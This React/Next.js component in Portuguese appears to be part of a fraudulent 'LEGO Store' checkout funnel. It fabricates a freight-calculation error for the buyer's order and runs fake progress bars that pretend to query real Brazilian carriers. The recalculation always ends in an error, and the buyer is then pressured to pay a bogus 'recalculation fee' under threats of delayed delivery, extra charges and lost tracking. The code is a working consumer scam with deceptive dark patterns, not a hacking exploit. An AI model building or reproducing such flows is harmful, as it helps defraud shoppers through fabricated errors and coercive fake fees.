"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"

interface UpsellData {
  img: string
  title: string
  price: string
  orderNo: string
  productId: string
  customerEmail: string
}

export default function UpsellFreteFlow() {
  const router = useRouter()
  const [currentView, setCurrentView] = useState<"orders" | "loading" | "upsell" | "freteCalculating">("orders")
  const [showErrorModal, setShowErrorModal] = useState(false)
  const [showDeclinePush, setShowDeclinePush] = useState(false)
  const [loadingProgress, setLoadingProgress] = useState(0)
  const [freteProgress, setFreteProgress] = useState(0)
  const [activeSteps, setActiveSteps] = useState<number[]>([])
  const [activeFields, setActiveFields] = useState<number[]>([])
  const [upsellData, setUpsellData] = useState<UpsellData>({
    img: "/placeholder.svg?height=160&width=160",
    title: "Produto LEGO",
    price: "",
    orderNo: "",
    productId: "",
    customerEmail: "",
  })

  const loadingRef = useRef<number>()
  const freteRef = useRef<number>()

  useEffect(() => {
    const checkoutProduct = localStorage.getItem("checkoutProduct")
    const pixPayment = localStorage.getItem("pixPayment")

    if (checkoutProduct) {
      const product = JSON.parse(checkoutProduct)
      let customerData = { email: "", name: "" }
      let realPrice = product.finalPrice?.toString() || product.price?.toString() || ""

      if (pixPayment) {
        const payment = JSON.parse(pixPayment)
        customerData = {
          email: payment.email || "",
          name: payment.name || "",
        }
        realPrice = payment.amount?.toString() || realPrice
      }

      setUpsellData({
        img: product.image || "https://images.seeklogo.com/logo-png/8/1/lego-logo-png_seeklogo-83157.png",
        title: product.name || "Produto LEGO",
        price: realPrice,
        orderNo: "#" + Math.floor(1000 + Math.random() * 9000),
        productId: product.id || "",
        customerEmail: customerData.email,
      })
    } else {
      const orderNo = "#" + Math.floor(1000 + Math.random() * 9000)
      setUpsellData({
        img: "https://images.seeklogo.com/logo-png/8/1/lego-logo-png_seeklogo-83157.png",
        title: "Produto LEGO",
        price: "",
        orderNo,
        productId: "",
        customerEmail: "",
      })
    }
  }, [])

  const formatPrice = (cents: string) => {
    if (!cents || isNaN(Number(cents))) return "—"
    const numValue = Number(cents)
    const finalValue = numValue > 1000 ? numValue / 100 : numValue
    return new Intl.NumberFormat("pt-BR", {
      style: "currency",
      currency: "BRL",
    }).format(finalValue)
  }

  const handleOrderClick = () => {
    setCurrentView("loading")
    setLoadingProgress(0)
    setActiveSteps([])

    const startTime = Date.now()
    const duration = 8000

    const animate = () => {
      const elapsed = Date.now() - startTime
      const progress = Math.min(elapsed / duration, 1)
      setLoadingProgress(progress * 100)

      if (progress < 1) {
        loadingRef.current = requestAnimationFrame(animate)
      } else {
        setCurrentView("upsell")
      }
    }

    loadingRef.current = requestAnimationFrame(animate)

    const stepTimes = [0, 2000, 4000, 6000]
    stepTimes.forEach((time, index) => {
      setTimeout(() => {
        setActiveSteps((prev) => [...prev, index])
      }, time)
    })
  }

  const handleAcceptFrete = () => {
    sessionStorage.setItem("upsell_frete_selected", "1")
    setCurrentView("freteCalculating")
    startFreteCalculating()
  }

  const handleDeclineFrete = () => {
    sessionStorage.setItem("upsell_frete_selected", "0")
    setShowDeclinePush(true)
  }

  const prepareFreteCheckout = () => {
    const freteProduct = {
      id: "frete-recalculo",
      name: "Recálculo de Frete",
      price: 2164, // preço em centavos (R$ 24,90)
      finalPrice: 2164,
      originalPrice: 2164,
      isFree: false,
      image: upsellData.img,
      description: "Serviço de recálculo de frete com transportadoras parceiras",
      quantity: 1,
      isFrete: true,
      isDigital: true,
      requiresShipping: false,
    }

    localStorage.setItem("upsellProduct", JSON.stringify(freteProduct))

    const originalProduct = localStorage.getItem("checkoutProduct")
    if (originalProduct) {
      localStorage.setItem("originalProduct", originalProduct)
    }

    router.push("/checkout-upsell")
  }

  const startFreteCalculating = () => {
    setFreteProgress(0)
    setActiveFields([])

    const fieldTimes = [800, 2000, 3200, 4400, 5600]
    fieldTimes.forEach((time, index) => {
      setTimeout(() => {
        setActiveFields((prev) => [...prev, index])
      }, time)
    })

    const startTime = Date.now()
    const duration = 12500

    const animate = () => {
      const elapsed = Date.now() - startTime
      const progress = Math.min(elapsed / duration, 1)
      setFreteProgress(progress * 100)

      if (progress < 1) {
        freteRef.current = requestAnimationFrame(animate)
      } else {
        setTimeout(() => {
          setShowErrorModal(true)
        }, 500)
      }
    }

    freteRef.current = requestAnimationFrame(animate)
  }

  useEffect(() => {
    return () => {
      if (loadingRef.current) cancelAnimationFrame(loadingRef.current)
      if (freteRef.current) cancelAnimationFrame(freteRef.current)
    }
  }, [])

  return (
    <div className="max-w-3xl mx-auto p-3">
      {currentView === "orders" && (
        <div>
          <div className="flex items-center gap-2 font-bold text-xs text-gray-600 uppercase tracking-wider mb-2">
            <div className="w-2 h-2 rounded-full bg-red-600 shadow-lg shadow-red-200"></div>
            PEDIDOS LEGO STORE
          </div>

          <button
            onClick={handleOrderClick}
            className="w-full flex gap-3 items-center rounded-2xl p-3 bg-gradient-to-r from-red-50 to-transparent hover:shadow-lg transition-all duration-200 active:translate-y-0.5"
          >
            <div className="w-7 h-7 rounded-full bg-gradient-to-br from-red-500 to-red-600 text-white font-black text-sm flex items-center justify-center">
              !
            </div>
            <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl overflow-hidden bg-gray-100 shadow-md flex-shrink-0">
              <img
                src={upsellData.img || "/placeholder.svg"}
                alt="Produto LEGO"
                className="w-full h-full object-cover object-center"
              />
            </div>
            <div className="flex-1 text-left min-w-0">
              <div className="flex items-center gap-2 flex-wrap">
                <div className="font-black text-base truncate">{upsellData.title}</div>
                <div className="text-xs bg-gray-100 rounded-full px-2 py-1 font-bold text-gray-600">
                  {upsellData.orderNo}
                </div>
                <div className="text-xs font-black text-red-800 bg-red-100 rounded-full px-2 py-1">
                  {formatPrice(upsellData.price)}
                </div>
              </div>
              <div className="text-xs text-red-800 font-semibold mt-1">
                Erro no cálculo de frete identificado. Clique para recalcular com transportadoras parceiras.
              </div>
            </div>
          </button>
        </div>
      )}

      {currentView === "loading" && (
        <div className="rounded-2xl p-4 bg-gradient-to-r from-red-50 to-transparent shadow-lg">
          <div className="flex gap-3 items-center mb-4">
            <div className="w-14 h-14 rounded-2xl overflow-hidden bg-gray-100 shadow-md">
              <img src={upsellData.img || "/placeholder.svg"} alt="Produto LEGO" className="w-14 h-14 object-cover" />
            </div>
            <div>
              <div className="font-black text-base">{upsellData.title}</div>
              <div className="text-xs text-gray-500">Pedido {upsellData.orderNo}</div>
            </div>
          </div>

          <div className="flex items-center gap-3 mb-4">
            <div className="flex-1 h-3 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full bg-gradient-to-r from-red-600 to-red-700 transition-all duration-300 ease-linear"
                style={{ width: `${Math.min(loadingProgress, 100)}%` }}
              />
            </div>
            <div className="text-xs text-gray-600 font-mono min-w-9 text-right">
              {Math.round(Math.min(loadingProgress, 100))}%
            </div>
          </div>

          <ul className="space-y-2">
            {[
              "Verificando transportadoras...",
              "Consultando tabelas de frete...",
              "Analisando rotas disponíveis...",
              "Detectando inconsistências...",
            ].map((step, index) => (
              <li
                key={index}
                className={`flex items-center gap-2 text-sm transition-all duration-300 ${
                  activeSteps.includes(index) ? "opacity-100 translate-y-0" : "opacity-25 translate-y-1"
                }`}
              >
                <div className="w-2 h-2 rounded-full bg-red-600"></div>
                <span>{step}</span>
              </li>
            ))}
          </ul>
        </div>
      )}

      {currentView === "upsell" && (
        <div className="rounded-3xl p-5 bg-gradient-to-r from-red-50 to-transparent shadow-xl space-y-5">
          <div className="flex gap-4 items-center flex-wrap">
            <div className="w-16 h-16 rounded-2xl overflow-hidden shadow-lg">
              <img src={upsellData.img || "/placeholder.svg"} alt="Produto LEGO" className="w-16 h-16 object-cover" />
            </div>
            <div className="flex-1">
              <div className="text-xs font-black text-red-700 uppercase tracking-wider">Erro no cálculo de frete</div>
              <h2 className="text-2xl font-black text-gray-900 leading-tight">Recálculo de Frete</h2>
            </div>
          </div>

          <div className="grid gap-5 lg:grid-cols-2 lg:items-start">
            <div className="space-y-3">
              {[
                "Consulta em tempo real com transportadoras parceiras.",
                "Recálculo automático baseado em peso e dimensões.",
                "Garantia de menor prazo de entrega disponível.",
                "Suporte especializado para rastreamento.",
              ].map((benefit, index) => (
                <div key={index} className="flex gap-3 items-start text-sm text-gray-700">
                  <div className="w-5 h-5 rounded-md bg-gradient-to-br from-red-600 to-red-700 flex-shrink-0 relative">
                    <div className="absolute left-1 top-0.5 w-2 h-2 border-r-2 border-b-2 border-white transform rotate-45"></div>
                  </div>
                  <span>{benefit}</span>
                </div>
              ))}
            </div>

            <div className="rounded-2xl p-4 bg-gradient-to-b from-white/60 to-white/20 shadow-lg space-y-3">
              <div className="flex gap-3 flex-wrap justify-center">
                <button
                  onClick={handleAcceptFrete}
                  className="px-6 py-3 bg-gradient-to-r from-red-600 to-red-700 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5 min-w-44"
                >
                  Recalcular frete agora
                </button>
                <button
                  onClick={handleDeclineFrete}
                  className="px-6 py-3 bg-gray-100 text-gray-800 font-black text-sm rounded-xl hover:bg-gray-200 transition-all duration-200 active:translate-y-0.5 min-w-44"
                >
                  Manter frete atual
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {currentView === "freteCalculating" && (
        <div className="rounded-3xl p-5 bg-gradient-to-r from-red-50 to-white shadow-xl space-y-4">
          <div>
            <h3 className="text-xl font-black text-gray-900">Recalculando Frete</h3>
            <div className="text-xs text-gray-500">O recálculo será concluído após a verificação.</div>
          </div>

          <div className="grid gap-4 lg:grid-cols-2">
            <div className="rounded-2xl p-3 bg-gray-50 space-y-3">
              <h4 className="text-xs font-bold uppercase tracking-wider text-red-700">Consultando transportadoras</h4>
              <div className="space-y-2">
                {[
                  { label: "Correios", value: "Sedex / PAC" },
                  { label: "Jadlog", value: "Expresso / Econômico" },
                  { label: "Total Express", value: "Rápido / Standard" },
                  { label: "Braspress", value: "Rodoviário" },
                ].map((field, index) => (
                  <div
                    key={index}
                    className={`flex justify-between items-center text-sm transition-all duration-500 ${
                      activeFields.includes(index) ? "opacity-100 translate-y-0" : "opacity-15 translate-y-1"
                    }`}
                  >
                    <span className="text-gray-500 text-xs">{field.label}</span>
                    <span className="font-bold text-gray-900">{field.value}</span>
                  </div>
                ))}
              </div>
            </div>

            <div className="rounded-2xl p-3 bg-gray-50 space-y-3">
              <h4 className="text-xs font-bold uppercase tracking-wider text-red-700">Resumo</h4>
              <div className="flex gap-3 items-center">
                <div className="w-14 h-14 rounded-2xl overflow-hidden bg-gray-100 shadow-md">
                  <img
                    src={upsellData.img || "/placeholder.svg"}
                    alt="Produto LEGO"
                    className="w-14 h-14 object-cover"
                  />
                </div>
                <div>
                  <div className="font-black text-sm">{upsellData.title}</div>
                  <div className="text-red-700 font-black text-sm">{formatPrice(upsellData.price)}</div>
                </div>
              </div>

              <div className="space-y-2">
                <div className="flex justify-between text-xs">
                  <span>Concluindo recálculo de frete</span>
                  <span className="font-mono text-gray-600">{Math.round(freteProgress)}%</span>
                </div>
                <div className="h-3 bg-gray-200 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-gradient-to-r from-red-600 to-red-700 transition-all duration-300 ease-linear"
                    style={{ width: `${freteProgress}%` }}
                  />
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {showErrorModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4">
          <div className="w-full max-w-lg rounded-2xl p-5 bg-gradient-to-b from-white to-gray-50 shadow-2xl space-y-4 animate-in fade-in zoom-in-95 duration-200">
            <div className="flex gap-3 items-center">
              <div className="w-14 h-14 rounded-full bg-gradient-to-br from-red-500 to-red-600 text-white font-black text-3xl flex items-center justify-center animate-pulse">
                !
              </div>
              <div>
                <h3 className="text-lg font-black text-red-800">Não foi possível concluir o recálculo</h3>
                <div className="text-xs text-gray-500">O recálculo foi interrompido antes da finalização</div>
              </div>
            </div>

            <div className="text-sm text-gray-700">
              Para recalcular o frete é necessário pagar a taxa de processamento. Caso não efetue o pagamento, poderão
              ocorrer consequências:
              <ul className="mt-2 ml-4 space-y-1 list-disc">
                <li>Atraso na entrega do produto</li>
                <li>Cobrança de frete adicional na entrega</li>
                <li>Impossibilidade de rastreamento</li>
              </ul>
            </div>

            <div className="flex justify-center">
              <button
                onClick={prepareFreteCheckout}
                className="px-6 py-3 bg-gradient-to-r from-red-500 to-red-600 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5"
              >
                Pagar taxa de recálculo
              </button>
            </div>
          </div>
        </div>
      )}

      {showDeclinePush && (
        <div className="fixed bottom-3 left-1/2 transform -translate-x-1/2 w-full max-w-3xl z-40 px-4 animate-in slide-in-from-bottom duration-300">
          <div className="rounded-2xl p-4 bg-gradient-to-b from-white to-gray-50 shadow-2xl space-y-3">
            <div className="flex gap-3 items-center">
              <div className="w-9 h-9 rounded-full bg-gradient-to-br from-red-500 to-red-600 text-white font-black text-lg flex items-center justify-center">
                !
              </div>
              <h4 className="font-black text-red-800">Atenção: manter frete atual pode gerar problemas</h4>
            </div>

            <div className="text-sm text-gray-700">
              Caso você opte por não recalcular o frete, poderá haver atrasos na entrega, cobrança adicional e
              dificuldades no rastreamento do produto.
            </div>

            <div className="flex gap-3 flex-wrap justify-center">
              <button
                onClick={() => {
                  setShowDeclinePush(false)
                  prepareFreteCheckout()
                }}
                className="px-4 py-2 bg-gradient-to-r from-red-600 to-red-700 text-white font-black text-sm rounded-xl shadow-lg hover:shadow-xl transition-all duration-200 active:translate-y-0.5"
              >
                Pagar taxa de recálculo
              </button>
              <button
                onClick={() => setShowDeclinePush(false)}
                className="px-4 py-2 bg-gray-100 text-gray-800 font-black text-sm rounded-xl hover:bg-gray-200 transition-all duration-200 active:translate-y-0.5"
              >
                Manter frete atual
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
